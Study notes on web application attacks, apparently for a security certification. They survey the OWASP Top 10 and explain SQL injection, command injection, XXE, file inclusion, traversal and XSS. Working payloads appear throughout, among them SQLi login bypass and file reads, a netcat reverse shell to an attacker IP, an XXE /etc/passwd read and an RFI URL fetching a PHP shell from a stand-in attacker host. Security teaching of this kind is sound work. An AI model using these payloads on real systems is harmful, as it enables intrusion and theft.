# Hacking Web Applications

## <u>Web Organizations</u>

- **Internet Engineering Task Force (IETF)** - Creates engineering documents to help make the Internet work better.
- **World Wide Web Consortium (W3C)** - A standards-developing community.
- **Open Web Application Security Project (OWASP)** - Organization focused on improving the security of software.

## <u>OWASP Web Top 10</u>

<p align="center">
<img width="60%" src="https://sdtimes.com/wp-content/uploads/2017/11/OWASP.png" />
</p>

*The [OWASP Top 10](https://owasp.org/www-project-top-ten/) is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.*

- **A1 - Injection Flaws** - SQL, OS and LDAP injection
- **A2 - Broken Authentication and Session Management** - functions related to authentication and session management that aren't implemented correctly
- **A3 - Sensitive Data Exposure** - not properly protecting sensitive data (SSN, CC  numbers, etc.)
- **A4 - XML External  Entities (XXE)** - exploiting XML  processors by uploading hostile content in an XML document
- **A5 - Broken Access Control** - having improper controls on areas that should be protected
- **A6 - Security Misconfiguration** - across all parts of the server and application
- **A7 - Cross-Site Scripting (XSS)** - taking untrusted data and sending it without input validation
- **A8 - Insecure Deserialization** - improperly de-serializing data
- **A9 - Using Components with Known Vulnerabilities** - libraries and frameworks that have known security holes
- **A10 - Insufficient Logging and Monitoring** - not having enough logging to detect attacks

**WebGoat** - project maintained by OWASP which is an insecure web application meant to be tested


## <u>Web Application Attacks</u>

- Most often hacked before of inherent weaknesses built into the program
- First step is to identify entry points (POST data, URL parameters, cookies, headers, etc.)
- **Tools for Identifying Entry Points**
  - WebScarab
  - HTTPPrint
  - BurpSuite
- **Web 2.0** - dynamic applications; have a larger attack surface due to simultaneous communication

---
## **SQL Injection**

Injecting SQL commands into input fields to produce output
  - Data Handling - Definition (DDL), manipulation (DML) and control (DCL)

SQL injection usually occurs when you ask a user for input, like their username/userid, and instead of a name/id, the user gives you an SQL statement that you will unknowingly run on your database.

- **SQLi is used for**:
  - Bypass authentication
  - Extract information
  - Insert injection


**SQL Syntax - Basics:**

SQL Command | Info.
-- | :--
``SELECT`` | extracts data from a database
``UPDATE`` | updates data in a database
``DELETE`` | deletes data from a database
``INSERT INTO`` | inserts new data into a database
``ALTER TABLE`` | modifies a table
``DROP TABLE`` | deletes a table
``CREATE INDEX`` | creates an index (search key)
``DROP INDEX`` | deletes an index
``UNION`` | is used to combine the result-set of two or more SELECT statements.

---

### SQL Injection in action:

- On the UserId input field, you can enter: 
    - `105 OR 1=1`.

- The is valid and will not return only UserId 105, this injection will return ALL rows from the "Users" table, **since OR 1=1 is always TRUE**. Then, the SQL statement will look like this:
    - `SELECT * FROM Users WHERE UserId = 105 OR 1=1;`

- Double dash ( `--` ) tells the server to ignore the rest of the query (in this example, the password check)

> ⚠️ **Basic test to see if SQL injection is possible is just inserting a single quote ( `'` )**
>  - Can be on input field or URL
>  - This will make the web app return a SQL syntax error meaning that you are able to inject SQL queries.


**Bypassing authentication:**
- `admin' or 1=1 -- ` 
  - Basically tells the server **if 1 = 1 (always true)** to allow the login and the double dash `--` will comment the rest of the query in this case, the password.
- variations: `1' or 1=1 #`

- Based on `=` is always true;
    - `" or ""="` --> The SQL above is valid and will return all rows from the "Users" table, since OR ""="" is always TRUE. 
    - This is valid and the SQL statement behind will look like this: ` SELECT * FROM Users WHERE Name ="John Doe" AND Pass ="myPass" `

**<u>Enumerating:</u>**
- `1' union all select 1,user() #`
  - The service are running as

- `user' UNION ALL select 1,table_name,3,4,5 FROM information_schema.tables`
  - Dropping the tables 

**<u>Load/Reading a file:</u>**
- `bob' union all select 1,load_file("/etc/passwd"),3,4,5 --`
  - Reading the /etc/passwd file

**<u>Writing a file:</u>**
- `bob' union all select 1,"Test",3,4,5 into outfile '/tmp/test.txt'--`
  - Writes the selected rows to a file. Column and line terminators can be specified to produce a specific output format.

**Fuzzing** - inputting random data into a target to see what will happen

**Tautology** - using always true statements to test SQL (e.g. `1=1`)

**In-band SQL injection** - uses same communication channel to perform attack

  - Usually is when data pulled can fit into data exported (where data goes to a web table)

  - Best for using `UNION` queries

**Out-of-band SQL injection** - uses different communication channels (e.g. export results to file on web server)

**Blind/inferential** - error messages and screen returns don't occur; usually have to guess whether command work or use timing to know

- **SQLi Tools:**
  - Sqlmap
  - sqlninja
  - Havij
  - SQLBrute
  - Pangolin
  - SQLExec
  - Absinthe
  - BobCat

---

### **Broken Authentication**
Broken Authentication usually occurs due to the issues with the application’s authentication mechanism;

- **Credential Stuffing and Brute Force Attacks**
- **Weak Passwords & Recovery Process**
- **Mismanagement of Session ID**

*An attacker can gain control over user accounts in a system. In the worst case, it could help them gain complete control over the system.*

---

### **Command Injection**
Execution of arbitrary commands on the host operating system via a vulnerable application.
- Injection are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. 
- Web apps sometimes need to execute OS commands to communicate with the underlying host OS and the file system. This can be done to run system commands, launch applications written in another programming language, or run shell, python, perl, or PHP scripts.

**Example**:
- Imagine a vulnerable application that has a common function that passes an **IP address from a user input** to the system's **ping command**.
- User input: `127.0.0.1`
- The following command is executed on the host OS:
  - `ping -c 5 127.0.0.1`
- Is possible to break out the ping command to execute the attacker arbitrary commands:
  - `ping -c 5 127.0.0.1; id`
- If the system is vulnerable the output will look like this (showing two OS commands, `ping` and `id`):

```console
--- 127.0.0.1 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 3999ms
rtt min/avg/max/mdev = 0.023/0.056/0.074/0.021 ms

uid=0(root) gid=0(root) groups=0(root)
```

- Without input sanitizing the attacker can do reverse shell:
   - `127.0.0.1; nc -nv <attacker's IP> 4444 -e /bin/bash`

---

### **Sensitive Data Exposure**

When the web application doesn’t adequately protect sensitive information like **session tokens, passwords, banking information, location, health data**, or any other similar crucial data whose leak can be critical for the user.

**Examples**:
1. *An application **stores credit card numbers in a database <u>without encryption</u>**. If an attacker gets access to the database through SQL injection, he could easily get the credit card numbers.*

2. **An application store passwords in the database using unsalted or simple hashes**. An attacker can expose the unsalted hashes using Rainbow Table attacks.

3. **A website that doesn’t enforce TLS or uses weak encryption.** An attacker could monitor network traffic and downgrade the connections from HTTPS to HTTP. Then, they can intercept the requests and steal the user’s session cookie

---

### **XEE - XML External  Entities**
Is a type of attack against an application that parses XML input. This attack occurs when **XML input containing a reference to an external entity is processed by a weakly configured XML parser.**

- Attackers can supply XML files with specially crafted DOCTYPE definitions to an XML parser with a weak security configuration to perform **path traversal, port scanning, and numerous attacks, including denial of service, server-side request forgery (SSRF), or even remote code execution.**

**Example**:

- External entities can reference URIs to retrieve content from local files or network resources.
- This payload will return the content of `/etc/passwd` file on target system's OS; (for windows you could reference `file:///c:/boot.ini` )

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

___

### **RFI - Remote File Inclusion**

Is a method that allows an attacker to employ a script to include a remotely hosted file on the webserver. The vulnerability promoting RFI is largely found on websites running on PHP. This is because PHP supports the ability to `‘include’` or `‘require’` additional files within a script;

**Vulnerable PHP Example**:

> **`$incfile = $_REQUEST["file"]; include($incfile.".php");`**

- The first line extracts the file parameter value from the HTTP request, while the second line uses that value to dynamically set the file name, without any appropriate sanitization of the file parameter value, this code can be exploited for unauthorized file uploads.

- For example the URL below contains an external reference to a reverse shell made in PHP file, stored in a remote location:
  - `http://www.example.com/vuln_page.php?file=http://www.hacker.com/netcat.php_` 

---


### **LFI - Local File Inclusion**: 
is very much similar to RFI. The only difference being that in LFI, in order to carry out the attack instead of including remote files, the attacker has to use local files (e.g: files on the current server can only be used to execute a malicious script).

**Examples**:
  - `http://example.com/?file=../../uploads/evil.php`

---

### **Directory Traversal**
An attacker can get sensitive information like the contents of the /etc/passwd file that contains a list of users on the server; Log files, source code, access.log and so on

**Examples:**
- `http://example.com/events.php?file=../../../../etc/passwd`
   - An attacker can get the contents of the **/etc/passwd** (file that contains a list of users on the server).
 
*Similarly, an attacker may leverage the Directory Traversal vulnerability to access **log files** (for example, **Apache access.log or error.log**), **source code**, and other sensitive information. This information may then be used to advance an attack.*

---
### **XSS (Cross-site scripting)**
Inputting JavaScript into a web form input field that alters what the page does.
  - Can also be passed via URL
  - Can be malicious by accessing cookies and sending them to a remote host
  - Can be mitigated by setting **HttpOnly** flag for cookies; But many hackers can circumvent this in order to execute XSS payloads.

###  Types of XSS:

1. **Stored XSS** (Persistent or Type-I) - stores the XSS in a forum or like for multiple people to access.

2. **Reflected XSS** (or also called a non-persistent XSS); when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. 

3. **DOM Based XSS** (or as it is called in some texts, “type-0 XSS”) is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim's browser used by the original client side script, so that the client side code runs in an “unexpected” manner.

Examples of XSS payloads:
- `"><script>alert(1)</script>`
- `<svg/onload="alert(1);"`
- ```<svg/OnLoad="`${prompt``}`">```
- `p=<svg/1='&q='onload=alert(1)>`

*Note: they vary regarding the filtering, validation and WAF capabilities.*

---
### **HTML Injection**
This vulnerability **occurs when user input is not correctly sanitized and the output is not encoded.** An injection allows the attacker to send a malicious HTML page to a victim. 

---
### **LDAP Injection**
Exploits applications that construct LDAP statements
  - Format for LDAP injection includes )(&)
---

### **SOAP Injection**
Inject query strings in order to bypass authentication
  - SOAP uses XML to format information
  - Messages are "one way" in nature
---
### **Buffer Overflow** 
Attempts to write data into application's buffer area to overwrite adjacent memory, execute code or crash a system
  - Inputs more data than the buffer is allowed
  - Includes stack, heap, NOP sleds and more
  - **Canaries** - systems can monitor these - if they are changed, they indicate a buffer overflow has occurred; placed between buffer and control data
---

### **Cross-Site Request Forgery (CSRF)**
Forces an end user to execute unwanted actions on an app they're already authenticated on
  - Inherits  identity and privileges of victim to perform an undesired function on victim's behalf
  - Captures the session and sends a request based off the logged in user's credentials
  - Can be mitigated by sending **random challenge tokens**

---

### **Session Fixation**
Attacker logs into a legitimate site and pulls a session ID; sends link with session ID to victim.  Once victim logs in, attacker can now log in and run with user's credentials

- **Cookies** - small text-based files stored that contains information like preferences, session details or shopping cart contents
  - Can be manipulated to change functionality (e.g. changing a cooking that says "ADMIN=no" to "yes")
  - Sometimes, but rarely, can also contain passwords

---
### **HTTP Response Splitting**
Adds header response data to an input field so server splits the response
  - Can be used to redirect a user to a malicious site
  - Is not an attack in and of itself - must be combined with another attack
  - With HTTP Response Splitting, it is possible to mount various kinds of attacks:
    - XSS
    - Web Cache Poisoning (defacement)
    - Browser cache poisoning
    - Hijacking pages with user-specific information
---

### **Insecure direct object references (IDOR)**
Is a common vulnerability that occurs when a reference to an <u>**internal implementation object is exposed without any other access control**</u>. The vulnerability is often easy to discover and allows attackers to access unauthorized data.

<p align="center">
<img width="69%" src="https://1tskcg39n5iu1jl9xp2ze2ma-wpengine.netdna-ssl.com/wp-content/uploads/2020/02/insecure-direct-object-reference-example.png" />
</p>

---
## Countermeasures
Input scrubbing for injection, SQL parameterization for SQL injection, input validation and sanitization for injections, keeping patched servers, turning off unnecessary services, ports and protocols
